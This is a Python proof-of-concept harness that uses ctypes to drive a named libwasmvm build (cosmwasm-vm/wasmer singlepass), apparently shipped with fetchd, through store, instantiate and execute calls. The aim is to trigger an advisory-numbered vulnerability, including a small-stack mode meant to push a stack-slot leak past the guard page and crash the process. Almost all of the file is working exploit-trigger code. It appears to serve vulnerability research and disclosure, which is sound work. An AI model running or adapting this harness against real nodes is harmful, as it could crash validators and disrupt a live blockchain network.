#!/usr/bin/env python3
"""
PoC harness: runs the GHSA-v2h8-j899-r676 trigger contract against the
EXACT libwasmvm shared library that fetchd v0.15.1 (commit ae12a4f) ships
in its production build chain:

    github.com/fetchai/priv_wasmvm_sec/v3 v3.0.8-rc.3 (commit d89faf180d3f...)
    internal/api/libwasmvm.x86_64.so  (git blob ed9b45993311142b3f1a...)

which bundles cosmwasm-vm 3.0.10-rc.3 / wasmer 7.4.2 (vulnerable,
singlepass, multi-value enabled).

Usage:
    python3 poc.py <mode>
      mode = store        : init cache + store_code(checked) + instantiate
      mode = run <wasm>   : same as store, then execute() the given module
"""

import ctypes as C
import json
import os
import sys
import threading

HERE = os.path.dirname(os.path.abspath(__file__))
SO = os.environ.get("LIBWASMVM_SO", "/tmp/wasmvm_rc3/libwasmvm.x86_64.so")
CACHE_DIR = "/tmp/wasmvm_rc3/cache"
GAS = 10_000_000_000_000  # 1e13

# ----------------------------------------------------------------- FFI types
U8SliceView = C.Structure = C.Structure  # placeholder to keep linters quiet


class U8SliceView(C.Structure):
    _fields_ = [("is_none", C.c_bool), ("ptr", C.c_void_p), ("len", C.c_size_t)]


class ByteSliceView(C.Structure):
    _fields_ = [("is_nil", C.c_bool), ("ptr", C.c_void_p), ("len", C.c_size_t)]


class UnmanagedVector(C.Structure):
    _fields_ = [("nil", C.c_bool), ("ptr", C.c_void_p),
                ("len", C.c_size_t), ("cap", C.c_size_t)]


class GasReport(C.Structure):
    _fields_ = [("limit", C.c_uint64), ("remaining", C.c_uint64),
                ("used_externally", C.c_uint64), ("used_internally", C.c_uint64)]


ReadFn = C.CFUNCTYPE(C.c_int32, C.c_void_p, C.c_void_p, C.POINTER(C.c_uint64),
                     U8SliceView, C.POINTER(UnmanagedVector), C.POINTER(UnmanagedVector))
WriteFn = C.CFUNCTYPE(C.c_int32, C.c_void_p, C.c_void_p, C.POINTER(C.c_uint64),
                      U8SliceView, U8SliceView, C.POINTER(UnmanagedVector))
RemoveFn = C.CFUNCTYPE(C.c_int32, C.c_void_p, C.c_void_p, C.POINTER(C.c_uint64),
                       U8SliceView, C.POINTER(UnmanagedVector))
ScanFn = C.CFUNCTYPE(C.c_int32, C.c_void_p, C.c_void_p, C.POINTER(C.c_uint64),
                     U8SliceView, U8SliceView, C.c_int32, C.c_void_p,
                     C.POINTER(UnmanagedVector))


class DbVtable(C.Structure):
    _fields_ = [("read_db", ReadFn), ("write_db", WriteFn),
                ("remove_db", RemoveFn), ("scan_db", ScanFn)]


class Db(C.Structure):
    _fields_ = [("gas_meter", C.c_void_p), ("state", C.c_void_p),
                ("vtable", DbVtable)]


ApiFn = C.CFUNCTYPE(C.c_int32, C.c_void_p, U8SliceView,
                    C.POINTER(UnmanagedVector), C.POINTER(UnmanagedVector),
                    C.POINTER(C.c_uint64))
ApiFnV = C.CFUNCTYPE(C.c_int32, C.c_void_p, U8SliceView,
                     C.POINTER(UnmanagedVector), C.POINTER(C.c_uint64))


class GoApiVtable(C.Structure):
    _fields_ = [("humanize_address", ApiFn), ("canonicalize_address", ApiFn),
                ("validate_address", ApiFnV)]


class GoApi(C.Structure):
    _fields_ = [("state", C.c_void_p), ("vtable", GoApiVtable)]


QueryFn = C.CFUNCTYPE(C.c_int32, C.c_void_p, C.c_uint64, C.POINTER(C.c_uint64),
                      U8SliceView, C.POINTER(UnmanagedVector), C.POINTER(UnmanagedVector))


class GoQuerierVtable(C.Structure):
    _fields_ = [("query_external", QueryFn)]


class GoQuerier(C.Structure):
    _fields_ = [("state", C.c_void_p), ("vtable", GoQuerierVtable)]


# ------------------------------------------------------------- host callbacks
def _noop_vec_out(p):
    if p:
        p[0] = UnmanagedVector(True, None, 0, 0)


@ReadFn
def cb_read(db, gm, gas_used, key, value_out, err_out):
    if gas_used:
        gas_used[0] = 0
    _noop_vec_out(value_out)
    _noop_vec_out(err_out)
    return 0


@WriteFn
def cb_write(db, gm, gas_used, key, value, err_out):
    if gas_used:
        gas_used[0] = 0
    _noop_vec_out(err_out)
    return 0


@RemoveFn
def cb_remove(db, gm, gas_used, key, err_out):
    if gas_used:
        gas_used[0] = 0
    _noop_vec_out(err_out)
    return 0


@ScanFn
def cb_scan(db, gm, gas_used, start, end, order, it_out, err_out):
    if gas_used:
        gas_used[0] = 0
    _noop_vec_out(err_out)
    return 0


@ApiFn
def cb_humanize(api, inp, out, err_out, gas_used):
    if gas_used:
        gas_used[0] = 0
    _noop_vec_out(out)
    _noop_vec_out(err_out)
    return 0


@ApiFn
def cb_canonicalize(api, inp, out, err_out, gas_used):
    if gas_used:
        gas_used[0] = 0
    _noop_vec_out(out)
    _noop_vec_out(err_out)
    return 0


@ApiFnV
def cb_validate(api, inp, err_out, gas_used):
    if gas_used:
        gas_used[0] = 0
    _noop_vec_out(err_out)
    return 0


@QueryFn
def cb_query(q, gas_limit, gas_used, req, res_out, err_out):
    if gas_used:
        gas_used[0] = 0
    _noop_vec_out(res_out)
    _noop_vec_out(err_out)
    return 0


KEEPALIVE = [cb_read, cb_write, cb_remove, cb_scan,
             cb_humanize, cb_canonicalize, cb_validate, cb_query]


def make_host():
    db = Db(None, None, DbVtable(cb_read, cb_write, cb_remove, cb_scan))
    api = GoApi(None, GoApiVtable(cb_humanize, cb_canonicalize, cb_validate))
    querier = GoQuerier(None, GoQuerierVtable(cb_query))
    return db, api, querier


def bytes_view(b: bytes) -> ByteSliceView:
    buf = C.create_string_buffer(b, len(b))
    v = ByteSliceView(False, C.cast(buf, C.c_void_p), len(b))
    v._buf = buf  # keep alive
    return v


def main():
    mode = sys.argv[1]
    lib = C.CDLL(SO)
    lib.init_cache.restype = C.c_void_p
    lib.init_cache.argtypes = [ByteSliceView, C.POINTER(UnmanagedVector)]
    lib.store_code.restype = UnmanagedVector
    lib.store_code.argtypes = [C.c_void_p, ByteSliceView, C.c_bool, C.c_bool,
                               C.POINTER(UnmanagedVector)]
    lib.instantiate.restype = UnmanagedVector
    lib.instantiate.argtypes = [C.c_void_p, ByteSliceView, ByteSliceView,
                                ByteSliceView, ByteSliceView, Db, GoApi,
                                GoQuerier, C.c_uint64, C.c_bool,
                                C.POINTER(GasReport), C.POINTER(UnmanagedVector)]
    lib.execute.restype = UnmanagedVector
    lib.execute.argtypes = lib.instantiate.argtypes

    os.makedirs(CACHE_DIR, exist_ok=True)
    cfg = json.dumps({
        "wasm_limits": {},
        "cache": {
            "base_dir": CACHE_DIR,
            "available_capabilities": [
                "cosmwasm_1_1", "cosmwasm_1_2", "cosmwasm_1_3", "cosmwasm_1_4",
                "cosmwasm_2_0", "cosmwasm_2_1", "cosmwasm_2_2",
                "iterator", "staking", "stargate",
            ],
            "memory_cache_size_bytes": 134217728,
            "instance_memory_limit_bytes": 3221225472,
        },
    }).encode()
    err = UnmanagedVector(True, None, 0, 0)
    cache = lib.init_cache(bytes_view(cfg), C.byref(err))
    if not cache:
        print("init_cache FAILED:", err.len, bytes(C.cast(err.ptr, C.POINTER(C.c_char * err.len)).contents) if err.ptr else b"")
        sys.exit(2)
    print("[+] cache initialized")

    # --- host handles (kept alive for the whole run)
    db, api, querier = make_host()

    def env_json():
        return json.dumps({
            "block": {"height": 1, "time": 1571797419879305533,
                      "chain_id": "poc-1"},
            "contract": {"address": "fetch1poccontract000000000000000000"},
            "transaction": None,
        }).encode()

    info_json = json.dumps({
        "sender": "fetch1attacker0000000000000000000000",
        "funds": [],
    }).encode()
    msg_json = b"{}"

    def run(call, label):
        err = UnmanagedVector(True, None, 0, 0)
        rep = GasReport(0, 0, 0, 0)
        out = call(C.byref(err), C.byref(rep))
        if err.ptr:
            msg = C.string_at(err.ptr, err.len)
        else:
            msg = b""
        print(f"[{label}] gas: limit={rep.limit} remaining={rep.remaining} "
              f"used_ext={rep.used_externally} used_int={rep.used_internally}")
        if err.ptr:
            print(f"[{label}] ERROR: {msg.decode(errors='replace')}")
            return False
        print(f"[{label}] OK ({out.len} bytes)")
        return True

    if mode == "store":
        wasm = open(os.path.join(HERE, "implicit_else.wasm"), "rb").read()
        err = UnmanagedVector(True, None, 0, 0)
        cs = lib.store_code(cache, bytes_view(wasm), True, True, C.byref(err))
        if err.ptr:
            print("store_code ERROR:", C.string_at(err.ptr, err.len).decode(errors="replace"))
            sys.exit(2)
        checksum = C.string_at(cs.ptr, cs.len)
        print("[+] store_code(checked=True) OK, checksum:", checksum.hex())
        inst = lambda e, r: lib.instantiate(cache, bytes_view(checksum), bytes_view(env_json()),
                                            bytes_view(info_json), bytes_view(msg_json),
                                            db, api, querier, GAS, False, r, e)
        run(inst, "instantiate")
        return

    assert mode in ("run", "run-smallstack")
    wasm_path = sys.argv[2]
    wasm = open(wasm_path, "rb").read()
    err = UnmanagedVector(True, None, 0, 0)
    cs = lib.store_code(cache, bytes_view(wasm), True, True, C.byref(err))
    if err.ptr:
        print("store_code ERROR:", C.string_at(err.ptr, err.len).decode(errors="replace"))
        sys.exit(2)
    checksum = C.string_at(cs.ptr, cs.len)
    print("[+] store_code(checked=True) OK, checksum:", checksum.hex())

    inst = lambda e, r: lib.instantiate(cache, bytes_view(checksum), bytes_view(env_json()),
                                        bytes_view(info_json), bytes_view(msg_json),
                                        db, api, querier, GAS, False, r, e)
    if not run(inst, "instantiate"):
        sys.exit(2)

    exe = lambda e, r: lib.execute(cache, bytes_view(checksum), bytes_view(env_json()),
                                   bytes_view(info_json), bytes_view(msg_json),
                                   db, api, querier, GAS, False, r, e)
    if mode == "run-smallstack":
        # Run the contract execution on a thread with a small native stack so the
        # per-execution 8-byte stack-slot leak crosses the guard page quickly.
        threading.stack_size(256 * 1024)
        t = threading.Thread(target=lambda: run(exe, "execute(smallstack)"), daemon=True)
        t.start()
        t.join(timeout=300)
        print("[+] thread joined (still alive = no crash)")
        return
    run(exe, "execute")
    print("[+] execute returned normally")


if __name__ == "__main__":
    main()
